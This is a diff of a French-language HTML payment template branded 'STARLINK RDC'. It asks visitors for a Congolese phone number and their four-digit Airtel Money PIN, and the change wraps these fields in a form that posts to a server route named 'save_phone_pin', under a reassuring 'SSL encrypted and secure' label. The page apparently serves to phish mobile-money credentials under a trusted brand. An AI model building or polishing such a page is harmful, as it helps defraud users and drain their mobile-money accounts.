@@ -1,261 +1,255 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Paiement - STARLINK RDC</title>
-
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-
-        body {
-            background: #f8f9fa;
-            min-height: 100vh;
-            color: #333;
-        }
-
-        .navbar {
-            background: #000;
-            padding: 14px 0;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-
-        .nav-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-        }
-
-        .nav-logo {
-            font-size: 1.5rem;
-            font-weight: bold;
-        }
-
-        .nav-subtitle {
-            font-size: 0.9rem;
-            color: #aaa;
-            margin-left: 8px;
-        }
-
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            margin-left: 30px;
-            font-size: 0.95rem;
-        }
-
-        .nav-links a:hover {
-            color: #00aaff;
-        }
-
-        .payment-container {
-            max-width: 460px;
-            margin: 60px auto 40px;
-            padding: 0 16px;
-        }
-
-        .payment-card {
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.18);
-            text-align: center;
-        }
-
-        .payment-header {
-            background: #d32f2f;
-            color: white;
-            padding: 50px 20px 30px;
-            position: relative;
-        }
-
-        .header-placeholder {
-            width: 90px;
-            height: 90px;
-            background: white;
-            margin: 0 auto 20px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3rem;
-            font-weight: bold;
-            color: #d32f2f;
-        }
-
-        .payment-header h2 {
-            font-size: 1.9rem;
-            margin: 0;
-        }
-
-        .payment-content {
-            padding: 40px 28px 50px;
-        }
-
-        .montant {
-            font-size: 2.2rem;
-            font-weight: bold;
-            color: #d32f2f;
-            margin: 20px 0 8px;
-        }
-
-        .service-name {
-            font-size: 1.2rem;
-            color: #555;
-            margin-bottom: 30px;
-        }
-
-        .instruction {
-            font-size: 1.1rem;
-            color: #444;
-            margin-bottom: 30px;
-        }
-
-        .phone-section {
-            margin-bottom: 40px;
-        }
-
-        .phone-label {
-            font-size: 1.05rem;
-            font-weight: 600;
-            margin-bottom: 10px;
-            display: block;
-        }
-
-        .phone-input {
-            display: flex;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            overflow: hidden;
-            max-width: 320px;
-            margin: 0 auto;
-        }
-
-        .country-code {
-            background: #f5f5f5;
-            padding: 16px 20px;
-            font-weight: 500;
-            border-right: 2px solid #ddd;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .phone-input input {
-            flex: 1;
-            padding: 16px;
-            border: none;
-            font-size: 1.2rem;
-            text-align: center;
-            background: white;
-        }
-
-        .pin-section {
-            margin-bottom: 40px;
-        }
-
-        .pin-label {
-            font-size: 1.05rem;
-            font-weight: 600;
-            margin-bottom: 16px;
-            display: block;
-        }
-
-        .pin-boxes {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-bottom: 40px;
-        }
-
-        .pin-box {
-            width: 60px;
-            height: 70px;
-            border: 3px solid #d32f2f;
-            border-radius: 12px;
-            font-size: 2.2rem;
-            text-align: center;
-            line-height: 64px;
-            color: #333;
-            background: white;
-            transition: border-color 0.2s;
-            outline: none;
-        }
-
-        .pin-box:focus {
-            border-color: #b71c1c;
-            box-shadow: 0 0 0 4px rgba(211, 47, 47, 0.15);
-        }
-
-        .btn-confirm {
-            width: 100%;
-            padding: 18px;
-            background: #d32f2f;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.25rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        .btn-confirm:hover {
-            background: #b71c1c;
-        }
-
-        .security-note {
-            margin-top: 24px;
-            font-size: 0.95rem;
-            color: #666;
-            text-align: center;
-        }
-
-        .security-icon {
-            color: #4caf50;
-            margin-right: 6px;
-        }
-
-        @media (max-width: 480px) {
-            .payment-header {
-                padding: 40px 16px 24px;
-            }
-
-            .payment-header h2 {
-                font-size: 1.7rem;
-            }
-
-            .montant {
-                font-size: 2rem;
-            }
-
-            .pin-box {
-                width: 55px;
-                height: 65px;
-                font-size: 2rem;
-                line-height: 59px;
-            }
-
-            .pin-boxes {
-                gap: 12px;
-            }
-        }
-    </style>
 </head>
-
 <body>
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+        background: #f8f9fa;
+        min-height: 100vh;
+        color: #333;
+    }
+
+    .navbar {
+        background: #000;
+        padding: 14px 0;
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+    }
+
+    .nav-container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 0 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        color: white;
+    }
+
+    .nav-logo {
+        font-size: 1.5rem;
+        font-weight: bold;
+    }
+
+    .nav-subtitle {
+        font-size: 0.9rem;
+        color: #aaa;
+        margin-left: 8px;
+    }
+
+    .nav-links a {
+        color: white;
+        text-decoration: none;
+        margin-left: 30px;
+        font-size: 0.95rem;
+    }
+
+    .nav-links a:hover {
+        color: #00aaff;
+    }
+
+    .payment-container {
+        max-width: 460px;
+        margin: 60px auto 40px;
+        padding: 0 16px;
+    }
+
+    .payment-card {
+        background: white;
+        border-radius: 20px;
+        overflow: hidden;
+        box-shadow: 0 12px 40px rgba(0,0,0,0.18);
+        text-align: center;
+    }
+
+    .payment-header {
+        background: #d32f2f;
+        color: white;
+        padding: 50px 20px 30px;
+        position: relative;
+    }
+
+    .header-placeholder {
+        width: 90px;
+        height: 90px;
+        background: white;
+        margin: 0 auto 20px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 3rem;
+        font-weight: bold;
+        color: #d32f2f;
+    }
+
+    .payment-header h2 {
+        font-size: 1.9rem;
+        margin: 0;
+    }
+
+    .payment-content {
+        padding: 40px 28px 50px;
+    }
+
+    .montant {
+        font-size: 2.2rem;
+        font-weight: bold;
+        color: #d32f2f;
+        margin: 20px 0 8px;
+    }
+
+    .service-name {
+        font-size: 1.2rem;
+        color: #555;
+        margin-bottom: 30px;
+    }
+
+    .instruction {
+        font-size: 1.1rem;
+        color: #444;
+        margin-bottom: 30px;
+    }
+
+    .phone-section {
+        margin-bottom: 40px;
+    }
+
+    .phone-label {
+        font-size: 1.05rem;
+        font-weight: 600;
+        margin-bottom: 10px;
+        display: block;
+    }
+
+    .phone-input {
+        display: flex;
+        border: 2px solid #ddd;
+        border-radius: 12px;
+        overflow: hidden;
+        max-width: 320px;
+        margin: 0 auto;
+    }
+
+    .country-code {
+        background: #f5f5f5;
+        padding: 16px 20px;
+        font-weight: 500;
+        border-right: 2px solid #ddd;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .phone-input input {
+        flex: 1;
+        padding: 16px;
+        border: none;
+        font-size: 1.2rem;
+        text-align: center;
+        background: white;
+    }
+
+    .pin-section {
+        margin-bottom: 40px;
+    }
+
+    .pin-label {
+        font-size: 1.05rem;
+        font-weight: 600;
+        margin-bottom: 16px;
+        display: block;
+    }
+
+    .pin-boxes {
+        display: flex;
+        justify-content: center;
+        gap: 16px;
+        margin-bottom: 40px;
+    }
+
+    .pin-box {
+        width: 60px;
+        height: 70px;
+        border: 3px solid #d32f2f;
+        border-radius: 12px;
+        font-size: 2.2rem;
+        text-align: center;
+        line-height: 64px;
+        color: #333;
+        background: white;
+        transition: border-color 0.2s;
+        outline: none;
+    }
+
+    .pin-box:focus {
+        border-color: #b71c1c;
+        box-shadow: 0 0 0 4px rgba(211, 47, 47, 0.15);
+    }
+
+    .btn-confirm {
+        width: 100%;
+        padding: 18px;
+        background: #d32f2f;
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 1.25rem;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.3s;
+    }
+
+    .btn-confirm:hover {
+        background: #b71c1c;
+    }
+
+    .security-note {
+        margin-top: 24px;
+        font-size: 0.95rem;
+        color: #666;
+        text-align: center;
+    }
+
+    .security-icon {
+        color: #4caf50;
+        margin-right: 6px;
+    }
+
+    @media (max-width: 480px) {
+        .payment-header {
+            padding: 40px 16px 24px;
+        }
+        .payment-header h2 {
+            font-size: 1.7rem;
+        }
+        .montant {
+            font-size: 2rem;
+        }
+        .pin-box {
+            width: 55px;
+            height: 65px;
+            font-size: 2rem;
+            line-height: 59px;
+        }
+        .pin-boxes {
+            gap: 12px;
+        }
+    }
+</style>
 
     <nav class="navbar">
         <div class="nav-container">
@@ -288,36 +282,44 @@
                     Entrez votre code PIN Airtel Money pour autoriser
                 </p>
 
-                <div class="phone-section">
-                    <label class="phone-label">Numéro de téléphone</label>
-                    <div class="phone-input">
-                        <div class="country-code">+243</div>
-                        <input type="tel"
-                               name="phone"
-                               placeholder="9XXXXXXXX"
-                               pattern="[0-9]{9}"
-                               inputmode="numeric"
-                               required>
+                <form method="POST" action="{{ url_for('save_phone_pin') }}">
+                    <div class="phone-section">
+                        <label class="phone-label">Numéro de téléphone</label>
+                        <div class="phone-input">
+                            <div class="country-code">+243</div>
+                            <input 
+                                type="tel"
+                                name="phone"
+                                value="{{ session.phone or '' }}"
+                                placeholder="9XXXXXXXX"
+                                pattern="[0-9]{9}"
+                                inputmode="numeric"
+                                maxlength="9"
+                                required
+                                onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                                oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                            >
+                        </div>
                     </div>
-                </div>
 
-                <div class="pin-section">
-                    <label class="pin-label">Entrez le code PIN 4 chiffres</label>
-                    <div class="pin-boxes">
-                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric" autofocus>
-                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
-                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
-                        <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                    <div class="pin-section">
+                        <label class="pin-label">Entrez le code PIN 4 chiffres</label>
+                        <div class="pin-boxes">
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric" autofocus>
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                        </div>
                     </div>
-                </div>
 
-                <button class="btn-confirm">CONFIRMER LE PAIEMENT</button>
+                    <button type="submit" class="btn-confirm">CONFIRMER LE PAIEMENT</button>
+                </form>
 
                 <p class="security-note">
                     <span class="security-icon">🔒</span> CRYPTÉ SSL ET SÉCURISÉ
                 </p>
-
             </div>
+
         </div>
     </div>
 
